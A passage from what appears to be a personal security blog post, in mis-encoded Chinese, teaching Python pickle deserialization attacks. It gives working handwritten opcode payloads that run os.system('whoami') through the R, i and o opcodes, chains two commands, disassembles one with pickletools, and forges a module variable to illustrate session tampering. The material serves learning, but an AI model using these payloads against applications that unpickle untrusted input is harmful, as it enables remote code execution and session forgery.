<td align="center">å°†æ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ appendåˆ°ç¬¬äºŒä¸ªå…ƒç´ (åˆ—è¡¨)ä¸­</td>
<td align="center">a</td>
<td align="center">æ ˆé¡¶å…ƒç´ å‡ºæ ˆï¼Œç¬¬äºŒä¸ªå…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="left">e</td>
<td align="center">å¯»æ‰¾æ ˆä¸­çš„ä¸Šä¸€ä¸ªMARKï¼Œç»„åˆä¹‹é—´çš„æ•°æ®å¹¶extendsåˆ°è¯¥MARKä¹‹å‰çš„ä¸€ä¸ªå…ƒç´ ï¼ˆå¿…é¡»ä¸ºåˆ—è¡¨ï¼‰ä¸­</td>
<td align="center">e</td>
<td align="center">MARKæ ‡è®°ä»¥åŠè¢«ç»„åˆçš„æ•°æ®å‡ºæ ˆï¼Œåˆ—è¡¨è¢«æ›´æ–°</td>
</tr>
</tbody></table>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œä»¥ä¸Šä»£ç å°±ä¼šæ‰§è¡Œwhoamiå‘½ä»¤ </p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>ç”¨è¿™ä¸ªæ¨¡å—å¯ä»¥æŠŠopcodeè½¬æ¢æˆæˆ‘ä»¬æ˜“è¯»çš„å½¢å¼</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickletools.dis(opcode)</span><br></pre></td></tr></table></figure>

<p>å¾—</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">0</span>: c    GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">11</span>: (    MARK</span><br><span class="line">   <span class="number">12</span>: S        STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">22</span>: t        TUPLE      (MARK at <span class="number">11</span>)</span><br><span class="line">   <span class="number">23</span>: R    REDUCE</span><br><span class="line">   <span class="number">24</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="Opcodeæ¼æ´åˆ©ç”¨"><a href="#Opcodeæ¼æ´åˆ©ç”¨" class="headerlink" title="Opcodeæ¼æ´åˆ©ç”¨"></a>Opcodeæ¼æ´åˆ©ç”¨</h2><h3 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><p>opcodeå¯ä»¥æ‰§è¡Œå¤šä¸ªå‘½ä»¤ï¼Œå¯ä»¥é€šè¿‡æ‰‹å†™çš„æ–¹å¼æ¥è¾¾åˆ°ã€‚</p>
<p>opcodeä¸­ï¼Œ**.**æ˜¯ç¨‹åºç»“æŸçš„æ ‡å¿—ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å»æ‰.å°†ä¸¤ä¸ªå­—èŠ‚æµæ‹¼æ¥åœ¨ä¸€èµ·ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tRcos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line">pickle.loads(opcode)</span><br><span class="line"><span class="comment">#å°±ä¼šæ‰§è¡Œä¸¤æ¬¡whoamiå‘½ä»¤</span></span><br></pre></td></tr></table></figure>

<h4 id="æ³¨æ„ï¼"><a href="#æ³¨æ„ï¼" class="headerlink" title="æ³¨æ„ï¼"></a>æ³¨æ„ï¼</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">éƒ¨åˆ†Linuxç³»ç»Ÿä¸‹å’ŒWindowsä¸‹çš„opcodeå­—èŠ‚æµå¹¶ä¸å…¼å®¹ï¼Œæ¯”å¦‚Windowsä¸‹æ‰§è¡Œç³»ç»Ÿå‘½ä»¤å‡½æ•°ä¸ºos.system()ï¼Œåœ¨éƒ¨åˆ†Linuxä¸‹åˆ™ä¸ºposix.system()ã€‚</span><br><span class="line">æ‰€ä»¥æœ‰æ—¶å€™linuxå’Œwinä¸‹çš„è„šæœ¬è¿è¡Œç»“æœæ˜¯ä¸åŒçš„ã€‚</span><br></pre></td></tr></table></figure>

<p><code>R</code> <code>i</code> <code>o</code> è¿™æ˜¯ä¸‰ä¸ªæ‰§è¡Œå‡½æ•°çš„å­—èŠ‚ç </p>
<p><code>R</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode1=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>i</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode2=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>o</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">opcode3=<span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;whoami&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="å˜é‡è¦†ç›–"><a href="#å˜é‡è¦†ç›–" class="headerlink" title="å˜é‡è¦†ç›–"></a>å˜é‡è¦†ç›–</h3><p>åœ¨sessionæˆ–tokenä¸­ï¼Œç”±äºéœ€è¦å­˜å‚¨ä¸€äº›ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬å¸¸å¸¸èƒ½å¤Ÿçœ‹è§pickleçš„èº«å½±ã€‚ç¨‹åºä¼šå°†ç”¨æˆ·çš„å„ç§ä¿¡æ¯åºåˆ—åŒ–å¹¶å­˜å‚¨åœ¨sessionæˆ–tokenä¸­ï¼Œä»¥æ­¤æ¥éªŒè¯ç”¨æˆ·çš„èº«ä»½ã€‚æ‰€ä»¥pickleå¯ä»¥è¿›è¡Œsessionä¼ªé€ ï¼Œæ¥å˜é‡è¦†ç›–ã€‚</p>
<p>å®éªŒ:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secretå˜é‡çš„å€¼ä¸º:&quot;</span> + secret.secret)</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">secret</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hack!!!&#x27;</span></span><br><span class="line"><span class="string">db.&#x27;&#x27;&#x27;</span></span><br><span class="line">fake = pickle.loads(opcode)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;secretå˜é‡çš„å€¼ä¸º:&quot;</span> + fake.secret)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#secret.py</span></span><br><span class="line">secret = <span class="string">&quot;This is a key&quot;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±å¯ä»¥æˆåŠŸè¦†ç›–åŸæ¥çš„secret</p>
<p>pickleæš‚æ—¶å…ˆå­¦åˆ°è¿™é‡Œå§<del>ç¬”è€…è§‰å¾—å­¦å†å¤šçš„ç†è®ºè¿˜æ˜¯å¾—åº”ç”¨ï¼Œå¦‚æœä»¥åæœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿å°±å†æ¥è¡¥å‘</del>ğŸ¤­</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Sauy"
      src="/images/2.png">
  <p class="site-author-name" itemprop="name">Sauy</p>
  <div class="site-description" itemprop="description">VENI,VEDI,VICI</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">17</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">æ ‡ç­¾</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://space.bilibili.com/415414982?spm_id_from=333.1387.0.0" title="Bilibili â†’ https:&#x2F;&#x2F;space.bilibili.com&#x2F;415414982?spm_id_from&#x3D;333.1387.0.0" rel="noopener" target="_blank"><i class="tv-retro fa-fw"></i>Bilibili</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Sauy</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
